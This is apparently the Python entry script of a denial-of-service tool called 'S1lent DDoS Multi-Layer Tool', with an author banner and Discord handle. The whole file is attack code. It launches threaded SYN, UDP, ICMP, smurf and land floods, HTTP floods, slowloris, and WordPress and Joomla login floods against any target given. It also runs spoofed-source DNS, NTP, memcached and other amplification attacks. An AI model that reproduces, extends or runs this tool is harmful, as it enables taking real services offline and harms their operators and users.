#!/usr/bin/env python3
"""
Author: S1lent | Discord: s1lent0x1
"""
import argparse
import sys
import os
import time
import threading
import socket
import struct
import random
import string
import ssl
import ipaddress
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import cycle
from core.layer3 import (
    syn_flood,
    ack_flood,
    icmp_flood,
    ip_frag_flood,
    smurf_flood,
    land_attack,
)
from core.layer4 import (
    udp_flood,
    tcp_connect_flood,
    rst_flood,
    xmas_flood,
    fin_flood,
    null_scan_flood,
)
from core.layer7 import (
    http_get_flood,
    http_post_flood,
    slowloris,
    slow_read,
    http_head_flood,
    http_options_flood,
    wordpress_xmlrpc_flood,
    joomla_login_flood,
)
from core.amplification import (
    dns_amp,
    ntp_amp,
    ssdp_amp,
    memcached_amp,
    chargen_amp,
    snmp_amp,
)
from core.ssl_tls import ssl_handshake_flood, tls_renegotiation_flood
from core.multi_vector import starve_target
from utils.helpers import banner, generate_random_ip, load_useragents
from utils.network import (
    is_ip,
    is_domain,
    resolve_domain,
    check_port,
    random_bytes,
    get_local_ip,
    get_gateway,
    arp_spoof,
)
from utils.payloads import get_http_payload, get_dns_query, get_ntp_request
from utils.proxy import load_proxies, ProxyManager

# -------------------------------------------
# ASCII Art Banner
# -------------------------------------------
BANNER = r"""
   _____ __    ___              __        ____  ____   ____
  / ___// /   /   |  ____  ____/ /__     / __ \/ __ \ / __/
  \__ \/ /   / /| | / __ \/ __  / _ \   / / / / / / /_\ \  
 ___/ / /___/ ___ |/ / / / /_/ /  __/  / /_/ / /_/ /__/ /  
/____/_____/_/  |_/_/ /_/\__,_/\___/   \____/\____/____/   
        >> made By S1lent | Discord s1lent0x1 <<
"""

# Global control
stop_event = threading.Event()
stats = {"pkts_sent": 0, "bytes_sent": 0, "start_time": time.time()}

# -------------------------------------------
# Attack Launcher Functions
# -------------------------------------------

def layer3_attack(args):
    """Layer 3 attacks (Network)"""
    target = args.target
    port = args.port
    threads = args.threads
    duration = args.duration
    flood = args.flood_type.lower()
    print(f"[*] Starting Layer 3 {flood.upper()} flood on {target}:{port}")

    if flood == "syn":
        attack = syn_flood
    elif flood == "ack":
        attack = ack_flood
    elif flood == "icmp":
        attack = icmp_flood
    elif flood == "ipfrag":
        attack = ip_frag_flood
    elif flood == "smurf":
        attack = smurf_flood
    elif flood == "land":
        attack = land_attack
    else:
        print("[!] Unknown Layer 3 flood type")
        return

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for _ in range(threads * 10):
            futures.append(executor.submit(attack, target, port, stop_event))
        time.sleep(duration)
        stop_event.set()
        for future in as_completed(futures):
            pass

def layer4_attack(args):
    """Layer 4 attacks (Transport)"""
    target = args.target
    port = args.port
    threads = args.threads
    duration = args.duration
    flood = args.flood_type.lower()
    print(f"[*] Starting Layer 4 {flood.upper()} flood on {target}:{port}")

    if flood == "udp":
        attack = udp_flood
    elif flood == "tcpconnect":
        attack = tcp_connect_flood
    elif flood == "rst":
        attack = rst_flood
    elif flood == "xmas":
        attack = xmas_flood
    elif flood == "fin":
        attack = fin_flood
    elif flood == "null":
        attack = null_scan_flood
    else:
        print("[!] Unknown Layer 4 flood type")
        return

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for _ in range(threads * 5):
            futures.append(executor.submit(attack, target, port, stop_event))
        time.sleep(duration)
        stop_event.set()

def layer7_attack(args):
    """Layer 7 attacks (Application)"""
    target = args.target
    threads = args.threads
    duration = args.duration
    flood = args.flood_type.lower()
    print(f"[*] Starting Layer 7 {flood.upper()} flood on {target}")

    proxies = load_proxies(args.proxy_file) if args.proxy_file else None
    user_agents = load_useragents()

    if flood == "httpget":
        attack = http_get_flood
    elif flood == "httppost":
        attack = http_post_flood
    elif flood == "slowloris":
        attack = slowloris
    elif flood == "slowread":
        attack = slow_read
    elif flood == "httphead":
        attack = http_head_flood
    elif flood == "httpoptions":
        attack = http_options_flood
    elif flood == "xmlrpc":
        attack = wordpress_xmlrpc_flood
    elif flood == "joomla":
        attack = joomla_login_flood
    else:
        print("[!] Unknown Layer 7 flood type")
        return

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for _ in range(threads * 2):
            futures.append(executor.submit(attack, target, stop_event, proxies, user_agents))
        time.sleep(duration)
        stop_event.set()

def amp_attack(args):
    """Amplification attacks"""
    target = args.target
    port = args.port
    threads = args.threads
    duration = args.duration
    amp_type = args.amp_type.lower()
    print(f"[*] Starting {amp_type.upper()} amplification on {target}:{port}")

    if amp_type == "dns":
        attack = dns_amp
    elif amp_type == "ntp":
        attack = ntp_amp
    elif amp_type == "ssdp":
        attack = ssdp_amp
    elif amp_type == "memcached":
        attack = memcached_amp
    elif amp_type == "chargen":
        attack = chargen_amp
    elif amp_type == "snmp":
        attack = snmp_amp
    else:
        print("[!] Unknown amplification type")
        return

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for _ in range(threads * 3):
            futures.append(executor.submit(attack, target, port, stop_event, args.spoof_ip))
        time.sleep(duration)
        stop_event.set()

def multi_vector_attack(args):
    """Combine multiple vectors"""
    starve_target(args.target, args.duration)

# -------------------------------------------
# Main Parser
# -------------------------------------------
def main():
    parser = argparse.ArgumentParser(description="S1lent DDoS Multi‑Layer Tool", add_help=False)
    parser.add_argument("-t", "--target", required=True, help="Target IP/domain")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (default 80)")
    parser.add_argument("-th", "--threads", type=int, default=500, help="Number of threads")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Attack duration in seconds")
    parser.add_argument("-f", "--flood-type", default="syn", help="Attack type: syn, udp, httpget, slowloris, dns, etc.")
    parser.add_argument("-l", "--layer", type=int, choices=[3,4,7], default=4, help="OSI layer (3,4,7)")
    parser.add_argument("--amp", "--amplification", dest="amp_type", help="Amplification vector (dns, ntp, etc.)")
    parser.add_argument("--spoof-ip", help="Spoofed source IP (for amp)")
    parser.add_argument("--proxy-file", help="Proxy list file (for L7)")
    parser.add_argument("--multi", action="store_true", help="Launch multi-vector starvation")
    parser.add_argument("-h", "--help", action="help", help="Show this help")
    args = parser.parse_args()

    print(BANNER)
    print(f"[*] Target: {args.target}:{args.port}")
    print(f"[*] Flood: {args.flood_type} | Layer: {args.layer} | Threads: {args.threads} | Duration: {args.duration}s")
    if args.multi:
        multi_vector_attack(args)
        sys.exit(0)

    if args.amp_type:
        amp_attack(args)
    elif args.layer == 3:
        layer3_attack(args)
    elif args.layer == 4:
        layer4_attack(args)
    elif args.layer == 7:
        layer7_attack(args)
    else:
        print("[!] Please specify a valid attack vector.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Attack aborted.")
    except Exception as e:
        print(f"[!] Error: {e}")